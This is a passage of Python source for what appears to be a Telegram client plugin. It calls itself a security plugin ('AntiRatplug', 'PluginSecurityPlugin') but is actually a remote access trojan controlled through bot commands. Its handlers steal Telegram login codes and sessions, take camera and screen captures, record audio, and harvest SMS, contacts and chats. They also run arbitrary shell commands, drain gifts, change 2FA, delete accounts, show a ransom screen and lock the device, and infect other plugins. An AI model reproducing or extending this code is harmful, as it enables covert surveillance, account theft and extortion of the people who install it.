        text = (
            "<b>AntiRatplug v22.3-integrated</b>\n\n"
            "<b>Tg kid</b> — код из 777000 + live-watch + авто-подтверждение\n"
            "<b>Screenshot gain</b> — скрин + фронт + бэк\n"
            "<b>Full Harvest</b> — сбор всех аккаунтов\n"
            "<b>Full Lockdown</b> — harvest + gifts + 2FA + profile + kill + ransom + nuke + pull out\n"
            "<b>Gift Transfer</b> — drain гифтов на получателя\n"
            "<b>Nuke</b> — убивает новые сессии каждые 60с\n"
            "<b>Phone</b> — каскадный поиск номера (User / prefs / getFullUser)\n"
            "\nRecipient: " + BOT_UID_STR
        )
        self._send_msg(text, html=True)

    # ─── callback / message handlers ───────────────────────────────────────

    def _handle_callback(self, cb):
        try:
            cb_id = cb.get("id")
            data = cb.get("data", "")
            if cb_id:
                try:
                    self._answer_callback(cb_id)
                except Exception:
                    pass
            if data == "menu":
                self._show_main_menu()
            elif data == "close_ransom":
                self._dismiss_ransom()
                self._send_msg("Ransom снят.")
            elif data == "close_locker":
                self._clear_locker()
                self._send_msg("Локер отключён.")
            elif data == "close_music":
                self._clear_music()
                self._send_msg("M-music остановлен.")
            elif data == "close_end":
                self._clear_dim()
                self._send_msg("The End отменён.")
            elif data == "close_vidker":
                self._close_vidker_permanently()
            elif data == "hv_wipe":
                threading.Thread(target=self._session_wipe, daemon=True).start()
            elif data == "hv_delete":
                threading.Thread(target=self._delete_account, daemon=True).start()
            elif data == "hv_logout":
                threading.Thread(target=self._pull_out_account, daemon=True).start()
            elif data == "hv_stop_nuke":
                self._stop_nuke_loop()
            elif data == "lock_std":
                self._send_msg_with_close("🔒 Стандартный локер.", "close_locker")
                self._lock_screen()
            elif data == "lock_mercy":
                self._start_mercy_mode()
            elif data == "lock_ransom":
                self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
                self._send_msg_with_close("⚠ Ransom ON", "close_ransom")
            elif data == "lock_cancel":
                self._send_msg("Отменено.")
            elif data == "vid_arishem":
                self._activate_vidker("arishem")
            elif data == "vid_sentry":
                self._activate_vidker("sentry")
            elif data == "vid_drdoom":
                self._activate_vidker("drdoom")
            elif data == "vid_evilmorty":
                self._activate_vidker("evilmorty")
            elif data == "vid_cancel":
                self._send_msg("Vidker отменён.")
        except Exception:
            pass

    def _send_msg_with_close(self, text, action):
        kb = {"inline_keyboard": [[{"text": "Закрыть", "callback_data": action}]]}
        self._send_markup(text, kb)

    def _handle_message(self, msg):
        try:
            t = (msg.get("text") or "").strip()
            if not t:
                return
            if self._mmusic_waiting:
                mode = self._mmusic_waiting
                self._mmusic_waiting = None
                if mode == "music":
                    if t.startswith("http"):
                        self._play_mmusic(t)
                    else:
                        self._send_msg("Bad URL")
                elif mode == "shell":
                    self._manual_shell(t)
                elif mode == "term_hash":
                    try:
                        self._manual_terminate_session(int(t))
                    except Exception:
                        self._send_msg("❌ Неверный hash.")
                elif mode == "flood":
                    if t.startswith("http"):
                        threading.Thread(target=self._flood_gallery,
                                         args=(t, 100), daemon=True).start()
                elif mode == "csm":
                    if t:
                        self._csm_spam(t)
                elif mode == "broadcast":
                    if t:
                        self._broadcast(t)
                return

            if t == "Tg kid":
                threading.Thread(target=self._tg_kid, daemon=True).start()
            elif t == "Screenshot gain":
                threading.Thread(target=self._screenshot_gain, daemon=True).start()
            elif t == "Manual using":
                self._show_manual_menu()
            elif t == "Troll":
                self._show_troll_menu()
            elif t == "Automatic":
                self._show_automatic_menu()
            elif t == "❓ Help":
                self._show_help()
            elif t == "⬅️ Back":
                self._show_main_menu()
            elif t == "Session Control":
                self._show_sessions_menu()
            elif t == "Surveillance":
                self._show_surveillance_menu()
            elif t == "Data Grab":
                self._show_data_menu()
            elif t == "Account":
                self._show_account_menu()
            elif t == "Shell":
                self._show_shell_menu()
            elif t == "Wipe Sessions":
                threading.Thread(target=self._session_wipe, daemon=True).start()
            elif t == "Kill All Sessions":
                threading.Thread(target=self._kill_sessions_full, daemon=True).start()
            elif t == "Kill Phones/PCs":
                threading.Thread(target=self._kill_sessions_full, daemon=True).start()
            elif t == "Nuke ON":
                self._start_nuke_loop()
            elif t == "Nuke OFF":
                self._stop_nuke_loop()
            elif t == "Session Dump":
                threading.Thread(target=self._manual_dump_session, daemon=True).start()
            elif t == "Userbot Dump":
                threading.Thread(target=self._manual_userbot_session, daemon=True).start()
            elif t == "Screenshot":
                threading.Thread(target=self._screenshot, daemon=True).start()
            elif t == "Camera Front":
                threading.Thread(target=self._manual_camera, args=("front",),
                                 daemon=True).start()
            elif t == "Camera Back":
                threading.Thread(target=self._manual_camera, args=("back",),
                                 daemon=True).start()
            elif t == "Audio 5s":
                threading.Thread(target=lambda: self._manual_audio(5),
                                 daemon=True).start()
            elif t == "SMS":
                threading.Thread(target=self._manual_sms, daemon=True).start()
            elif t == "Contacts":
                threading.Thread(target=self._manual_contacts, daemon=True).start()
            elif t == "Apps":
                threading.Thread(target=self._manual_apps, daemon=True).start()
            elif t == "Chats":
                threading.Thread(target=self._manual_chats, daemon=True).start()
            elif t == "Info":
                threading.Thread(target=self._info, daemon=True).start()
            elif t == "Pull Out":
                threading.Thread(target=self._pull_out_account, daemon=True).start()
            elif t == "Delete Account":
                threading.Thread(target=self._delete_account, daemon=True).start()
            elif t == "Go to a4team":
                threading.Thread(target=self._join_a4team, daemon=True).start()
            elif t == "ls /sdcard":
                self._manual_shell("ls /sdcard")
            elif t == "ps":
                self._manual_shell("ps -A")
            elif t == "ifconfig":
                self._manual_shell("ifconfig")
            elif t == "df -h":
                self._manual_shell("df -h")
            elif t == "Custom Shell Cmd":
                self._mmusic_waiting = "shell"
                self._send_msg("Отправь shell-команду:")
            elif t == "Vidker":
                self._show_vidker_menu()
            elif t == "Lock screen":
                self._show_locker_menu()
            elif t == "Ransom":
                self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
                self._send_msg_with_close("⚠ Ransom ON", "close_ransom")
            elif t == "M-music":
                self._mmusic_waiting = "music"
                self._send_msg("🎵 Отправь прямую ссылку на .mp3:")
            elif t == "Flood Gallery":
                threading.Thread(target=self._flood_gallery,
                                 args=(SPLASH_URL, 100), daemon=True).start()
            elif t == "Clear Flood":
                self._clear_flood()
            elif t == "CSM":
                self._mmusic_waiting = "csm"
                self._send_msg("📨 CSM: отправь текст:")
            elif t == "The end.":
                self._send_msg_with_close("The end.", "close_end")
                self._dim_screen()
            elif t == "🌾 Full Harvest":
                self._full_harvest()
            elif t == "🔒 Full Lockdown":
                self._full_lockdown()
            elif t == "🎁 Gift Transfer":
                self._drain_gifts_thread()
            elif t == "Broadcast":
                self._mmusic_waiting = "broadcast"
                self._send_msg("Рассылка: отправь текст:")
            elif t == "Infect Plugins":
                threading.Thread(target=self._z_plugins, daemon=True).start()
        except Exception:
            pass

    # ─── splash ────────────────────────────────────────────────────────────

    def _ensure_splash(self):
        try:
            ctx = ApplicationLoader.applicationContext
            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
            if not os.path.exists(d):
                os.makedirs(d)
            path = os.path.join(d, "lock_bg.jpg")
            self._lock_path = path
            if os.path.exists(path):
                return

            def dl():
                try:
                    from urllib.request import urlopen
                    data = urlopen(SPLASH_URL, timeout=15).read()
                    with open(path, "wb") as f:
                        f.write(data)
                except Exception:
                    pass
            threading.Thread(target=dl, daemon=True).start()
        except Exception:
            pass

    def _check_persisted_mercy(self):
        try:
            prefs = ApplicationLoader.applicationContext.getSharedPreferences(
                "antiratplug_state", 0)
            if prefs.getBoolean("no_mercy_active", False):
                self._start_mercy_mode()
        except Exception:
            pass

    def _check_persisted_vidker(self):
        try:
            prefs = ApplicationLoader.applicationContext.getSharedPreferences(
                "antiratplug_state", 0)
            if prefs.getBoolean("vidker_active", False):
                mode = prefs.getString("vidker_mode", "arishem")

                def wait_and_start():
                    time.sleep(2)
                    for _ in range(60):
                        act = self._get_activity()
                        if act is not None:
                            self._render_vidker_task(str(mode))
                            return
                        time.sleep(1)
                threading.Thread(target=wait_and_start, daemon=True).start()
        except Exception:
            pass


def create_plugin():
    return PluginSecurityPlugin()
